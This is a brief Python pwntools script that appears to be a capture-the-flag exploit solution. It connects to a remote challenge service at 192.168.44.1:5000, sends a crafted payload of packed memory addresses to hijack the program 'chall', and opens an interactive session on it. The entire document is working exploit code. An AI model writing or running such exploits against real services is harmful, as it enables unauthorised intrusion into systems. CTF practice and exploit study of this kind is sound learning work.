from pwn import *

# r = process("./challx")
r = remote("192.168.44.1", 5000)

elf = ELF("./chall")

context.log_level = "debug"

r.recvuntil("Your input :")
payload = p64(0x494030)+b"\x00"*8
payload += p64(0x4c3b30)


r.sendline(payload)

r.interactive()
